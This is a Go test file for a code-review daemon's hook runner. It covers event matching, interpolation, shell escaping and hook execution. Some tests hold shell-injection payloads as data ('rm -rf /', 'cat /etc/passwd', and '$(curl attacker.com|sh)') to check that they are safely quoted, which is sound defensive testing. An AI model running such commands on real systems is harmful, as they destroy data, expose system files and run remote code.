package daemon

import (
	"bytes"
	"fmt"
	"log"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/roborev-dev/roborev/internal/config"
)

// quote wraps a string in platform-appropriate shell quoting (matches shellEscape output).
func quote(s string) string {
	return shellEscape(s)
}

// setupRunner initializes a HookRunner and Broadcaster for testing.
func setupRunner(t *testing.T, cfg *config.Config) (*HookRunner, Broadcaster) {
	t.Helper()
	b := NewBroadcaster()
	hr := NewHookRunner(NewStaticConfig(cfg), b, log.Default())
	t.Cleanup(hr.Stop)
	return hr, b
}

func poll(t *testing.T, timeout time.Duration, condition func() bool) {
	t.Helper()
	deadline := time.Now().Add(timeout)
	for time.Now().Before(deadline) {
		if condition() {
			return
		}
		time.Sleep(50 * time.Millisecond)
	}
	t.Fatalf("condition not met within %v", timeout)
}

// waitForFile polls for the existence of a file until the timeout expires.
func waitForFile(t *testing.T, path string, timeout time.Duration) {
	t.Helper()
	waitForFiles(t, timeout, path)
}

// waitForFiles polls for the existence of multiple files until the timeout expires.
func waitForFiles(t *testing.T, timeout time.Duration, paths ...string) {
	t.Helper()
	poll(t, timeout, func() bool {
		for _, path := range paths {
			if _, err := os.Stat(path); err != nil {
				return false
			}
		}
		return true
	})
}

// waitForFileContent polls until the file exists and has non-empty content.
func waitForFileContent(t *testing.T, path string, timeout time.Duration) string {
	t.Helper()
	var content []byte
	poll(t, timeout, func() bool {
		var err error
		content, err = os.ReadFile(path)
		return err == nil && len(content) > 0
	})
	return string(content)
}

// noopCmd returns a platform-appropriate no-op shell command.
func noopCmd() string {
	if runtime.GOOS == "windows" {
		return "Write-Output ok"
	}
	return "true"
}

// touchCmd returns a platform-appropriate shell command to create a file.
// Uses forward slashes on Windows to avoid TOML/shell escaping issues.
func touchCmd(path string) string {
	if runtime.GOOS == "windows" {
		// runHook uses PowerShell on Windows, so use PowerShell commands directly.
		// Use forward slashes — PowerShell resolves them correctly.
		return "New-Item -ItemType File -Force -Path '" + filepath.ToSlash(path) + "'"
	}
	return "touch " + path
}

// pwdCmd returns a platform-appropriate shell command to write the cwd to a file.
func pwdCmd(path string) string {
	if runtime.GOOS == "windows" {
		return "[IO.File]::WriteAllText('" + filepath.ToSlash(path) + "', (Get-Location).Path)"
	}
	return "pwd > " + path
}

func TestMatchEvent(t *testing.T) {
	tests := []struct {
		pattern   string
		eventType string
		want      bool
	}{
		{"review.failed", "review.failed", true},
		{"review.completed", "review.completed", true},
		{"review.failed", "review.completed", false},
		{"review.*", "review.failed", true},
		{"review.*", "review.completed", true},
		{"review.*", "review.started", true},
		{"review.*", "other.event", false},
		{"other.*", "review.failed", false},
	}

	for _, tt := range tests {
		got := matchEvent(tt.pattern, tt.eventType)
		if got != tt.want {
			t.Errorf("matchEvent(%q, %q) = %v, want %v", tt.pattern, tt.eventType, got, tt.want)
		}
	}
}

func TestInterpolate(t *testing.T) {
	event := Event{
		JobID:    42,
		Repo:     "/home/user/myrepo",
		RepoName: "myrepo",
		SHA:      "abc123def456",
		Agent:    "codex",
		Verdict:  "F",
		Findings: "High — missing input validation in handler",
		Error:    "agent timeout",
	}

	tests := []struct {
		cmd  string
		want string
	}{
		{
			"echo {job_id} {sha}",
			"echo 42 " + quote("abc123def456"),
		},
		{
			"notify --repo {repo_name} --verdict {verdict}",
			"notify --repo " + quote("myrepo") + " --verdict " + quote("F"),
		},
		{
			"log {error}",
			"log " + quote("agent timeout"),
		},
		{
			"process {findings}",
			"process " + quote("High — missing input validation in handler"),
		},
		{
			"",
			"",
		},
	}

	for _, tt := range tests {
		got := interpolate(tt.cmd, event)
		if got != tt.want {
			t.Errorf("interpolate(%q) = %q, want %q", tt.cmd, got, tt.want)
		}
	}
}

func TestInterpolateShellInjection(t *testing.T) {
	// Test with payloads that attempt to break out of quoting and execute commands.
	// We assert safety properties rather than exact output to avoid testing
	// shellEscape against itself.
	payloads := []string{
		"'; rm -rf / #",
		"`rm -rf /`",
		"$(rm -rf /)",
		"a; echo pwned",
		"a & echo pwned",
		"a | cat /etc/passwd",
	}

	for _, payload := range payloads {
		// Test via both {error} and {findings} since findings contain arbitrary agent output
		event := Event{JobID: 1, Repo: "/repo", Error: payload, Findings: payload}
		got := interpolate("echo {error}", event)
		gotFindings := interpolate("echo {findings}", event)

		for _, result := range []string{got, gotFindings} {
			prefix := "echo "
			if !strings.HasPrefix(result, prefix) || len(result) <= len(prefix)+1 {
				t.Fatalf("payload %q: unexpected format (too short or wrong prefix): %q", payload, result)
			}
			val := result[len(prefix):]
			if val[0] != '\'' || val[len(val)-1] != '\'' {
				t.Errorf("payload %q: not single-quoted: %q", payload, result)
			}
			substr := payload[:4]
			if !strings.Contains(val, substr) {
				t.Errorf("payload %q: escaped value doesn't contain expected substring %q: %q", payload, substr, val)
			}
		}
	}
}

func TestInterpolateQuotedPlaceholders(t *testing.T) {
	// Placeholders are auto-escaped with single quotes, so users should NOT
	// wrap them in additional quotes. This test documents the behavior:
	// double-quoting a placeholder produces nested quotes which is valid shell
	// but includes the literal single quotes inside the double-quoted string.
	event := Event{
		JobID:    1,
		Repo:     "/repo",
		RepoName: "myrepo",
		Error:    "simple error",
	}

	// Unquoted placeholder (recommended) -- clean output
	got := interpolate("echo {error}", event)
	if want := "echo " + quote("simple error"); got != want {
		t.Errorf("unquoted placeholder: got %q, want %q", got, want)
	}

	// Double-quoted placeholder -- works but includes literal quotes around the value
	got = interpolate(`echo "{error}"`, event)
	if want := `echo "` + quote("simple error") + `"`; got != want {
		t.Errorf("double-quoted placeholder: got %q, want %q", got, want)
	}

	// Empty value produces empty quoted string
	event.Verdict = ""
	got = interpolate("echo {verdict}", event)
	if want := "echo " + quote(""); got != want {
		t.Errorf("empty value: got %q, want %q", got, want)
	}
}

func TestShellEscape(t *testing.T) {
	var tests []struct {
		in   string
		want string
	}
	if runtime.GOOS == "windows" {
		tests = []struct {
			in   string
			want string
		}{
			{"hello", "'hello'"},
			{"", "''"},
			{"it's", "'it''s'"},
			{"a;b", "'a;b'"},
			{`say "hi"`, `'say "hi"'`},
			{"%PATH%", "'%PATH%'"},
		}
	} else {
		tests = []struct {
			in   string
			want string
		}{
			{"hello", "'hello'"},
			{"", "''"},
			{"it's", "'it'\"'\"'s'"},
			{"a;b", "'a;b'"},
		}
	}
	for _, tt := range tests {
		got := shellEscape(tt.in)
		if got != tt.want {
			t.Errorf("shellEscape(%q) = %q, want %q", tt.in, got, tt.want)
		}
	}

	// Verify injection payloads are properly enclosed in quotes on all platforms
	injections := []string{
		"'; rm -rf /",
		"`rm -rf /`",
		"$(cat /etc/passwd)",
		"a; echo pwned",
	}
	for _, payload := range injections {
		got := shellEscape(payload)
		if len(got) < 2 {
			t.Fatalf("shellEscape(%q) too short: %q", payload, got)
		}
		if got[0] != '\'' || got[len(got)-1] != '\'' {
			t.Errorf("shellEscape(%q) not single-quoted: %q", payload, got)
		}
	}
}

func TestBeadsCommand(t *testing.T) {
	event := Event{
		Type:     "review.failed",
		JobID:    7,
		Repo:     "/home/user/myrepo",
		RepoName: "myrepo",
		SHA:      "abc123def456",
		Agent:    "codex",
		Error:    "timeout",
	}

	cmd := beadsCommand(event)
	if cmd == "" {
		t.Fatal("expected non-empty command for review.failed")
	}
	if !strings.Contains(cmd, "bd create") {
		t.Errorf("expected bd create in command, got %q", cmd)
	}
	if !strings.Contains(cmd, "roborev show 7") {
		t.Errorf("expected 'roborev show 7' in command, got %q", cmd)
	}

	// Completed with pass should return empty
	event.Type = "review.completed"
	event.Verdict = "P"
	cmd = beadsCommand(event)
	if cmd != "" {
		t.Errorf("expected empty command for passing review, got %q", cmd)
	}

	// Completed with fail should return a command
	event.Verdict = "F"
	cmd = beadsCommand(event)
	if cmd == "" {
		t.Fatal("expected non-empty command for failing review")
	}
	if !strings.Contains(cmd, "-p 2") {
		t.Errorf("expected priority 2 for failing review, got %q", cmd)
	}
	if !strings.Contains(cmd, "roborev fix 7") {
		t.Errorf("expected 'roborev fix' hint in failing review command, got %q", cmd)
	}
}

func TestBeadsCommandShortSHA(t *testing.T) {
	event := Event{
		Type:     "review.failed",
		JobID:    1,
		Repo:     "/repo",
		RepoName: "repo",
		SHA:      "abcdef1234567890",
	}
	cmd := beadsCommand(event)
	if !strings.Contains(cmd, "abcdef1") {
		t.Errorf("expected truncated SHA in command, got %q", cmd)
	}
	if strings.Contains(cmd, "abcdef1234567890") {
		t.Errorf("expected SHA to be truncated, got %q", cmd)
	}
}

func TestBeadsCommandShellEscape(t *testing.T) {
	event := Event{
		Type:     "review.failed",
		JobID:    1,
		Repo:     "/repo",
		RepoName: "$(curl attacker.com|sh)",
		SHA:      "abc123",
	}
	cmd := beadsCommand(event)
	// Must use single quotes so the shell does not expand $()
	if strings.Contains(cmd, `"$(curl`) {
		t.Errorf("title must not be double-quoted; got %q", cmd)
	}
	if !strings.Contains(cmd, "'") {
		t.Errorf("title should be single-quoted; got %q", cmd)
	}
}

func TestResolveCommand(t *testing.T) {
	event := Event{
		Type:  "review.failed",
		JobID: 5,
		Repo:  "/repo",
		SHA:   "abc123",
		Agent: "codex",
	}

	// Custom command
	hook := config.HookConfig{
		Event:   "review.failed",
		Command: "echo {job_id}",
	}
	cmd := resolveCommand(hook, event)
	if cmd != "echo 5" { // job_id is numeric, not shell-escaped
		t.Errorf("expected 'echo 5', got %q", cmd)
	}

	// Beads type
	hook = config.HookConfig{
		Event: "review.failed",
		Type:  "beads",
	}
	cmd = resolveCommand(hook, event)
	if cmd == "" {
		t.Error("expected non-empty beads command")
	}
}

func TestHookRunnerFiresHooks(t *testing.T) {

	tmpDir := t.TempDir()
	markerFile := filepath.Join(tmpDir, "hook-fired")

	cfg := &config.Config{
		Hooks: []config.HookConfig{
			{
				Event:   "review.completed",
				Command: touchCmd(markerFile),
			},
		},
	}

	_, broadcaster := setupRunner(t, cfg)

	broadcaster.Broadcast(Event{
		Type:     "review.completed",
		TS:       time.Now(),
		JobID:    1,
		Repo:     tmpDir,
		RepoName: "test",
		SHA:      "abc123",
		Agent:    "test",
		Verdict:  "P",
	})

	waitForFile(t, markerFile, 5*time.Second)
}

func TestHookRunnerWorkingDirectory(t *testing.T) {

	tmpDir := t.TempDir()
	markerFile := filepath.Join(tmpDir, "pwd-test")

	cfg := &config.Config{
		Hooks: []config.HookConfig{
			{
				Event:   "review.failed",
				Command: pwdCmd(markerFile),
			},
		},
	}

	_, broadcaster := setupRunner(t, cfg)

	broadcaster.Broadcast(Event{
		Type:     "review.failed",
		TS:       time.Now(),
		JobID:    1,
		Repo:     tmpDir,
		RepoName: "test",
		SHA:      "abc",
		Agent:    "test",
		Error:    "fail",
	})

	dataStr := waitForFileContent(t, markerFile, 5*time.Second)

	got := filepath.Clean(strings.TrimSpace(dataStr))
	want := filepath.Clean(tmpDir)
	// On Windows, resolve 8.3 short paths to long paths for comparison
	if runtime.GOOS == "windows" {
		if g, err := filepath.EvalSymlinks(got); err == nil {
			got = g
		}
		if w, err := filepath.EvalSymlinks(want); err == nil {
			want = w
		}
	}
	equal := got == want
	if runtime.GOOS == "windows" {
		equal = strings.EqualFold(got, want)
	}
	if !equal {
		t.Errorf("hook ran in %q, want %q", got, want)
	}
}

func TestHookRunnerNoMatchDoesNotFire(t *testing.T) {

	tmpDir := t.TempDir()
	markerFile := filepath.Join(tmpDir, "should-not-exist")

	cfg := &config.Config{
		Hooks: []config.HookConfig{
			{
				Event:   "review.completed",
				Command: touchCmd(markerFile),
			},
		},
	}

	hr, broadcaster := setupRunner(t, cfg)

	// Send a failed event - hook is only for completed
	broadcaster.Broadcast(Event{
		Type:     "review.failed",
		TS:       time.Now(),
		JobID:    1,
		Repo:     tmpDir,
		RepoName: "test",
		SHA:      "abc",
		Agent:    "test",
		Error:    "fail",
	})

	hr.WaitUntilIdle()
	if _, err := os.Stat(markerFile); err == nil {
		t.Fatal("hook should not have fired for non-matching event")
	}
}

func TestHooksSliceNotAliased(t *testing.T) {

	// Verify that repo hooks don't leak into the global config's Hooks slice
	tmpDir := t.TempDir()
	markerGlobal := filepath.Join(tmpDir, "global-fired")
	markerRepo := filepath.Join(tmpDir, "repo-fired")

	globalHooks := []config.HookConfig{
		{Event: "review.failed", Command: touchCmd(markerGlobal)},
	}
	cfg := &config.Config{
		Hooks: globalHooks,
	}

	// Write a repo config with an additional hook
	repoDir := t.TempDir()
	writeRepoConfig(t, repoDir, `
[[hooks]]
event = "review.failed"
command = "`+touchCmd(markerRepo)+`"
`)

	_, broadcaster := setupRunner(t, cfg)

	// Fire event for the repo
	broadcaster.Broadcast(Event{
		Type:  "review.failed",
		TS:    time.Now(),
		JobID: 1,
		Repo:  repoDir,
		SHA:   "abc",
		Agent: "test",
		Error: "fail",
	})

	// Wait for hooks to run
	waitForFile(t, markerRepo, 5*time.Second)

	// The global config's Hooks slice must still have exactly 1 element
	if len(cfg.Hooks) != 1 {
		t.Errorf("global Hooks slice was mutated: len=%d, want 1", len(cfg.Hooks))
	}
}

func TestHookRunnerGlobalAndRepoHooksBothFire(t *testing.T) {

	// Both global and per-repo hooks should fire for the same event
	globalDir := t.TempDir()
	repoDir := t.TempDir()
	globalMarker := filepath.Join(globalDir, "global-fired")
	repoMarker := filepath.Join(repoDir, "repo-fired")

	cfg := &config.Config{
		Hooks: []config.HookConfig{
			{Event: "review.failed", Command: touchCmd(globalMarker)},
		},
	}

	// Write repo config with its own hook
	writeRepoConfig(t, repoDir, `
[[hooks]]
event = "review.failed"
command = "`+touchCmd(repoMarker)+`"
`)

	_, broadcaster := setupRunner(t, cfg)

	broadcaster.Broadcast(Event{
		Type:  "review.failed",
		TS:    time.Now(),
		JobID: 1,
		Repo:  repoDir,
		SHA:   "abc",
		Agent: "test",
		Error: "fail",
	})

	waitForFiles(t, 5*time.Second, globalMarker, repoMarker)
}

func TestHookRunnerRepoOnlyHooks(t *testing.T) {

	// Repo hooks fire even when there are no global hooks
	repoDir := t.TempDir()
	markerFile := filepath.Join(repoDir, "repo-only")

	cfg := &config.Config{} // no global hooks

	writeRepoConfig(t, repoDir, `
[[hooks]]
event = "review.completed"
command = "`+touchCmd(markerFile)+`"
`)

	_, broadcaster := setupRunner(t, cfg)

	broadcaster.Broadcast(Event{
		Type:    "review.completed",
		TS:      time.Now(),
		JobID:   1,
		Repo:    repoDir,
		SHA:     "abc",
		Agent:   "test",
		Verdict: "P",
	})

	waitForFile(t, markerFile, 5*time.Second)
}

func TestHookRunnerRepoHookDoesNotFireForOtherRepo(t *testing.T) {

	// A repo's hooks should not fire for events from a different repo
	repoA := t.TempDir()
	repoB := t.TempDir()
	markerFile := filepath.Join(repoA, "should-not-exist")

	cfg := &config.Config{} // no global hooks

	// Only repoA has hooks
	writeRepoConfig(t, repoA, `
[[hooks]]
event = "review.failed"
command = "`+touchCmd(markerFile)+`"
`)

	hr, broadcaster := setupRunner(t, cfg)

	// Fire event for repoB -- repoA's hooks should NOT fire
	broadcaster.Broadcast(Event{
		Type:  "review.failed",
		TS:    time.Now(),
		JobID: 1,
		Repo:  repoB,
		SHA:   "abc",
		Agent: "test",
		Error: "fail",
	})

	hr.WaitUntilIdle()
	if _, err := os.Stat(markerFile); err == nil {
		t.Fatal("repo hook fired for a different repo's event")
	}
}

func TestHookRunnerStopUnsubscribes(t *testing.T) {
	broadcaster := NewBroadcaster()
	cfg := &config.Config{}

	before := broadcaster.SubscriberCount()
	hr := NewHookRunner(NewStaticConfig(cfg), broadcaster, log.Default())
	afterSub := broadcaster.SubscriberCount()
	if afterSub != before+1 {
		t.Errorf("expected subscriber count %d after NewHookRunner, got %d", before+1, afterSub)
	}

	hr.Stop()
	// Give the goroutine a moment to exit
	time.Sleep(100 * time.Millisecond)

	afterStop := broadcaster.SubscriberCount()
	if afterStop != before {
		t.Errorf("expected subscriber count %d after Stop, got %d", before, afterStop)
	}
}

// writeRepoConfig writes a .roborev.toml file into repoDir, failing the test on error.
func writeRepoConfig(t *testing.T, repoDir, content string) {
	t.Helper()
	if err := os.WriteFile(filepath.Join(repoDir, ".roborev.toml"), []byte(content), 0644); err != nil {
		t.Fatalf("failed to write .roborev.toml: %v", err)
	}
}

func TestHandleEventLogsWhenHooksFired(t *testing.T) {
	var buf bytes.Buffer
	logger := log.New(&buf, "", 0)

	cfg := &config.Config{
		Hooks: []config.HookConfig{
			{Event: "review.completed", Command: noopCmd()},
			{Event: "review.completed", Command: noopCmd()},
		},
	}

	hr := &HookRunner{cfgGetter: NewStaticConfig(cfg), logger: logger}
	hr.handleEvent(Event{
		Type:    "review.completed",
		JobID:   42,
		Repo:    t.TempDir(),
		SHA:     "abc",
		Verdict: "P",
	})

	hr.wg.Wait() // Wait for async goroutines

	logOutput := buf.String()
	if !strings.Contains(logOutput, "fired 2 hook(s)") {
		t.Errorf("expected log to contain 'fired 2 hook(s)', got %q", logOutput)
	}
	if !strings.Contains(logOutput, "review.completed") {
		t.Errorf("expected log to contain event type, got %q", logOutput)
	}
	if !strings.Contains(logOutput, "job 42") {
		t.Errorf("expected log to contain job ID, got %q", logOutput)
	}
}

func TestHandleEventNoLogWhenNoHooksMatch(t *testing.T) {
	var buf bytes.Buffer
	logger := log.New(&buf, "", 0)

	cfg := &config.Config{
		Hooks: []config.HookConfig{
			{Event: "review.completed", Command: "echo test"},
		},
	}

	hr := &HookRunner{cfgGetter: NewStaticConfig(cfg), logger: logger}
	hr.handleEvent(Event{
		Type:  "review.failed",
		JobID: 99,
		Repo:  t.TempDir(),
		SHA:   "abc",
	})

	if strings.Contains(buf.String(), "fired") {
		t.Errorf("expected no log output when no hooks match, got %q", buf.String())
	}
}

func TestWaitUntilIdle_ConcurrentEvents(t *testing.T) {
	// A dedicated stress test proving WaitUntilIdle waits past the event-processing boundary
	// under timing races and concurrent broadcasts.

	tmpDir := t.TempDir()

	cfg := &config.Config{
		Hooks: []config.HookConfig{
			// We use a command that touches a file to verify execution.
			// It incorporates {job_id} to ensure we can verify each individual event fired.
			{Event: "review.completed", Command: touchCmd(filepath.Join(tmpDir, "job-{job_id}"))},
		},
	}

	for i := range 50 {
		hr, broadcaster := setupRunner(t, cfg)

		var wg sync.WaitGroup
		numEvents := 10

		for j := range numEvents {
			wg.Add(1)
			go func(jobID int64) {
				defer wg.Done()
				broadcaster.Broadcast(Event{
					Type:     "review.completed",
					TS:       time.Now(),
					JobID:    jobID,
					Repo:     tmpDir,
					RepoName: "test",
					SHA:      "abc",
					Agent:    "test",
				})
			}(int64(i*100 + j))
		}

		// Wait for all broadcasts to be enqueued
		wg.Wait()

		// WaitUntilIdle must wait until all hooks for queued events have finished
		hr.WaitUntilIdle()

		// Verify all hook marker files were created
		for j := range numEvents {
			markerFile := filepath.Join(tmpDir, fmt.Sprintf("job-%d", i*100+j))
			if _, err := os.Stat(markerFile); err != nil {
				t.Fatalf("iteration %d: marker file for job %d was not created before WaitUntilIdle returned", i, i*100+j)
			}
		}
	}
}

func TestWaitUntilIdle_StopDoesNotDeadlock(t *testing.T) {
	cfg := &config.Config{
		Hooks: []config.HookConfig{
			{Event: "review.completed", Command: "true"},
		},
	}
	b := NewBroadcaster()
	hr := NewHookRunner(NewStaticConfig(cfg), b, log.Default())

	done := make(chan struct{})
	go func() {
		hr.WaitUntilIdle()
		close(done)
	}()

	// Give WaitUntilIdle time to block on idleCh send
	time.Sleep(10 * time.Millisecond)
	hr.Stop()

	select {
	case <-done:
	case <-time.After(2 * time.Second):
		t.Fatal("WaitUntilIdle deadlocked after Stop")
	}
}
